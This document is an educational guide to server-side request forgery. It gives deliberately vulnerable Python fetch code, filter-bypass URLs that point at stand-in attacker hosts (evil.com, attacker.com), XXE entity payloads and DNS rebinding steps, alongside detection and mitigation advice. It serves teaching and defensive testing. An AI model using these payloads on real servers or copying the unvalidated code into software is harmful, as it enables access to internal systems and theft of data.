---
title: Server-Side Request Forgery (SSRF) Comprehensive Guide
date: 2025-11-29
category: guides
tags: web
---

## Table of Contents
1. [What is SSRF?](#what-is-ssrf)
2. [Impact of SSRF Attacks](#impact-of-ssrf-attacks)
3. [Types of SSRF Attacks](#types-of-ssrf-attacks)
4. [Common SSRF Vulnerabilities and Scenarios](#common-ssrf-vulnerabilities-and-scenarios)
5. [SSRF Bypass Techniques](#ssrf-bypass-techniques)
6. [DNS Rebinding](#dns-rebinding)
7. [Detection Methods](#detection-methods)
8. [Exploitation Steps](#exploitation-steps)
9. [Mitigation and Prevention](#mitigation-and-prevention)
10. [Real-World Examples](#real-world-examples)

## What is SSRF?

Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to cause the server-side application to make requests to unintended locations.

In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure or to arbitrary external systems, potentially leaking sensitive data.

### How SSRF Works

SSRF occurs when an application accepts user-controllable input that specifies a URL or network resource, and then uses this input to make a request on behalf of the server without proper validation.

```mermaid
graph TD
    A[Attacker] -->|Sends malicious URL| B[Web Application]
    B -->|Makes request to| C[Internal/External Resource]
    C -->|Returns response| B
    B -->|Sends response| A
```

## Impact of SSRF Attacks

| Impact | Description |
|--------|-------------|
| **Access Internal Systems** | Attackers can reach internal services (like databases, APIs, admin panels) that aren't normally exposed. |
| **Bypass Security Controls** | The server makes the request, so firewalls or IP restrictions can be bypassed. |
| **Steal Sensitive Data** | Attackers can read internal data like credentials, configs, or secrets. |
| **Remote Code Execution** | In some cases, SSRF can lead to RCE or control over internal servers. |
| **Server Abuse** | Attackers can send malicious requests to other websites/services using your server's IP. |
| **Cloud Exploits** | On cloud platforms, SSRF can expose metadata and give access to cloud resources. |

## Types of SSRF Attacks

### SSRF Against the Server

In this type of SSRF, the attacker tricks the server into making a request to itself (via localhost or 127.0.0.1).

#### Why Apps Trust Local Requests

- **Access Control is Separate**: A different system (like a proxy or firewall) handles access checks. Local requests skip this layer.
- **Disaster Recovery Logic**: Admin access might be allowed without login if the request is from the local machine.
- **Separate Admin Interface**: Admin panel might run on a different port that's not directly accessible from the internet.

#### Example Scenario

```text
Normal request:
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId=1

Attacker sends:
stockApi=http://localhost/admin
```

The server fetches its own /admin page, which is normally protected. Since the request is local, the server allows full admin access.

### SSRF Against Back-End Systems

Sometimes the server can access internal systems (with private IPs like 192.168.x.x) that normal users can't reach. These internal systems are often less secure and may not require authentication.

#### Example Scenario

```text
Admin interface is hosted at: http://192.168.0.68/admin (internal IP)
Attacker sends: stockApi=http://192.168.0.68/admin
```

The server makes the request on the attacker's behalf and returns the admin page.

## Common SSRF Vulnerabilities and Scenarios

### Basic SSRF

Applications that directly use user input to make HTTP requests without validation.

**Vulnerable Code Example:**
```python
@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    response = requests.get(url)
    return response.text
```

### Blind SSRF

Blind SSRF happens when the server makes the request, but you don't see the result in the response.

#### Detection

Use a service like Burp Collaborator or your own HTTP server to see if the server makes a request to you.

**Example:**
```text
Referer: http://your-collaborator-domain.com
```

### SSRF with Blacklist-Based Input Filters

Some applications try to block SSRF by blacklisting dangerous inputs like:
- 127.0.0.1
- localhost
- /admin

### SSRF with Whitelist-Based Input Filters

Some applications try to prevent SSRF by using a whitelistâ€”only allowing URLs that start with or contain trusted values.

### SSRF via Open Redirection

Sometimes, SSRF filters only allow URLs from trusted domains, but if that trusted domain has an open redirection vulnerability, attackers can use it to trick the server into going somewhere else.

### SSRF in Different Contexts

#### SSRRF via Referer Header

Some web applications have internal tools that:
- Log the Referer header for analytics
- Automatically fetch the content of the Referer URL

#### SSRF via Data Formats

Some structured data formats (like XML, YAML, SVG) allow the inclusion of URLs inside them. When the server parses this data, it might make a request to the URL specified.

**Example with XML:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://evil.com/malicious">
]>
<root>
  <data>&xxe;</data>
</root>
```

## SSRF Bypass Techniques

### Bypassing Blacklist Filters

1. **Alternate IP Representations**
   - Decimal: 2130706433 (for 127.0.0.1)
   - Octal: 017700000001 (for 127.0.0.1)
   - Shortened: 127.1 (for 127.0.0.1)

2. **Custom Domain That Resolves to Localhost**
   - Register a domain and make it resolve to 127.0.0.1.

3. **URL Encoding & Case Variations**
   - Encoding: /admin â†’ %2fadmin
   - Case tricks: LoCaLhOsT instead of localhost

4. **Use Redirects**
   - Host a URL that redirects to the blocked target.
   - Try different redirect status codes (e.g., 301, 302, 307)

### Bypassing Whitelist Filters

1. **Credentials Injection with @**
   ```
   https://trusted.com:fakepass@evil.com
   ```
   Filter may see: https://trusted.com âœ…
   But the actual request goes to evil.com

2. **Fragment Trick with #**
   ```
   https://evil.com#trusted.com
   ```
   Filter sees trusted.com âœ…
   Actual request goes to evil.com

3. **Subdomain Trick**
   ```
   https://trusted.com.attacker.com
   ```
   Filter matches trusted.com âœ…
   But DNS resolves to your domain (attacker.com)

4. **URL Encoding & Double Encoding**
   - / becomes %2F
   - @ becomes %40
   - Double encoding tricks: %252F â†’ gets decoded to %2F â†’ then /

5. **Combining Techniques**
   ```
   https://trusted.com#@evil.com
   https://trusted.com.%09attacker.com (%09 = tab)
   ```

### Bypassing SSRF Filters with Open Redirection

If the trusted domain has an open redirection vulnerability:

```
stockApi=http://weliketoshop.net/product/nextProduct?path=http://192.168.0.68/admin
```

Steps:
- Filter allows it (URL starts with weliketoshop.net)
- Server follows the redirect to: http://192.168.0.68/admin

## DNS Rebinding

DNS rebinding is a technique that can bypass SSRF protections by changing the DNS resolution of a hostname between validation checks and the actual request.

### How DNS Rebinding Works

1. **Initial Request**: The attacker sends a request with a hostname that resolves to a safe IP address
2. **Validation**: The application validates the IP address and allows the request
3. **DNS Change**: The attacker changes the DNS record to point to an internal IP address
4. **Actual Request**: The application makes the request to the internal IP address

```mermaid
sequenceDiagram
    participant Attacker
    participant DNS Server
    participant Web App
    participant Internal Service
    
    Attacker->>Web App: Request with hostname example.com
    Web App->>DNS Server: Resolve example.com
    DNS Server-->>Web App: 1.2.3.4 (safe IP)
    Web App->>Web App: Validation passes (1.2.3.4 is allowed)
    
    Note over Attacker,DNS Server: Attacker changes DNS record
    
    Web App->>DNS Server: Resolve example.com again
    DNS Server-->>Web App: 127.0.0.1 (internal IP)
    Web App->>Internal Service: Request to internal service
```

### Example Scenario

```text
Attacker sends:
  GET /api/download?file=http://surya.com/secret.txt

Step 1: Reverse Proxy
  â†’ Resolves surya.com â†’ public IP (e.g., 1.2.3.4) âœ… allowed

Step 2: Reverse Proxy forwards request to backend

Step 3: Backend receives request
  â†’ Resolves surya.com again
     - If TTL expired and you rebinded to 127.0.0.1 âœ… SSRF success
```

## Detection Methods

### Manual Testing

1. **Identify Potential SSRF Points**
   - Look for parameters that might contain URLs
   - Check for functionality that fetches external resources
   - Examine headers like Referer

2. **Test with Different Payloads**
   - Try accessing localhost (127.0.0.1)
   - Try accessing private IP ranges (192.168.x.x, 10.x.x.x)
   - Use Burp Collaborator or similar for blind SSRF detection

### Automated Testing

1. **SSRF Scanners**
   - Burp Suite Professional
   - OWASP ZAP
   - Custom scripts

2. **Out-of-Band Detection**
   - Burp Collaborator
   - Custom OAST services

## Exploitation Steps

1. **Identify Potential SSRF Vulnerability**
   - Find functionality that processes URLs
   - Look for features that fetch external resources

2. **Confirm Vulnerability**
   - Try basic payloads to see if you can access different domains
   - Use Burp Collaborator to detect blind SSRF

3. **Bypass Filters**
   - Try the techniques mentioned above
   - Test different encoding methods
   - Experiment with redirects

4. **Exploit**
   - Access internal services
   - Extract sensitive data
   - Attempt to escalate to RCE

5. **Document Findings**
   - Record the vulnerability
   - Provide proof of concept
   - Suggest remediation

## Mitigation and Prevention

### Input Validation

1. **Whitelist Allowed Domains**
   - Only allow requests to specific, trusted domains
   - Implement strict validation

2. **Validate URLs**
   - Parse and validate the URL structure
   - Check against a list of allowed protocols

3. **Avoid User-Supplied URLs**
   - Use indirect references or IDs instead of full URLs
   - Map IDs to pre-approved URLs server-side

### Network Controls

1. **Network Segmentation**
   - Separate web servers from internal networks
   - Implement proper firewall rules

2. **Egress Filtering**
   - Restrict outbound connections from web servers
   - Allow only necessary outbound traffic

3. **Disable Unnecessary Protocols**
   - Disable protocols like file://, gopher://, etc.

### Server Configuration

1. **Disable Redirects**
   - Configure HTTP clients to not follow redirects
   - Implement timeout limits

2. **Response Handling**
   - Don't return raw responses from external requests
   - Filter and sanitize responses

3. **Use Security Libraries**
   - Libraries with built-in SSRF protection
   - Keep libraries updated

## Real-World Examples

### Example 1: Basic SSRF

```python
# Vulnerable code
def fetch_resource(url):
    response = requests.get(url)
    return response.text

# Exploit
fetch_resource("http://localhost/admin")
```

### Example 2: Blind SSRF

```python
# Vulnerable code
def log_referer(referer):
    # Server logs the referer for analytics
    # No response returned to user
    requests.get(referer, timeout=1)
    return "Logged successfully"

# Exploit
log_referer("http://attacker.com/collect")
```

### Example 3: SSRF with Filter Bypass

```python
# Vulnerable code with filter
def fetch_resource(url):
    if not url.startswith("https://trusted.com"):
        return "Not allowed"
    response = requests.get(url)
    return response.text

# Exploit using credentials injection
fetch_resource("https://trusted.com:password@evil.com")
```

### Example 4: SSRF via XML

```xml
<!-- Malicious XML payload -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost/admin">
]>
<root>
  <data>&xxe;</data>
</root>
```

---

> **Note**: This guide is for educational purposes and authorized security testing only. Always obtain proper authorization before testing systems for vulnerabilities.
